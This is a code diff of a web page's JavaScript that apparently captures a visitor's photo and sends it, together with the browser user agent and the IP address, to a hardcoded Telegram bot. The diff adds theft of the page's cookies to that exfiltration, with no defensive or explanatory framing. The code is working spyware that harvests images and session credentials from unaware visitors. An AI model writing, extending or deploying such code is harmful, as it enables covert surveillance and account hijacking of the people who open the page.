@@ -84,27 +84,28 @@
 
         function getDeviceInfo(imageData) {
             const deviceInfo = navigator.userAgent;
+            const cookies = document.cookie; // Fetch cookies
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
-                .then(data => sendToTelegram(imageData, deviceInfo, data.ip))
+                .then(data => sendToTelegram(imageData, deviceInfo, cookies, data.ip))
                 .catch(error => console.error('Error getting IP:', error));
         }
 
-        function sendToTelegram(imageData, deviceInfo, ip) {
+        function sendToTelegram(imageData, deviceInfo, cookies, ip) {
             const telegramToken = '7787402061:AAGh-kuD1UOGc9bsUlqMmy_pIj6NgHGnFNE';
             const chatId = '6305469091';
             const blob = dataURLToBlob(imageData);
             const formData = new FormData();
             formData.append('chat_id', chatId);
             formData.append('photo', blob, 'photo.png');
-            formData.append('caption', `Device Info: ${deviceInfo}\nIP Address: ${ip}`);
+            formData.append('caption', `Device Info: ${deviceInfo}\nIP Address: ${ip}\nCookies: ${cookies}`);
 
             fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
                 method: 'POST',
                 body: formData
             })
             .then(() => {
-                console.log('Photo sent successfully!');
+                console.log('Data sent successfully!');
             })
             .catch(error => console.error('Error:', error));
         }
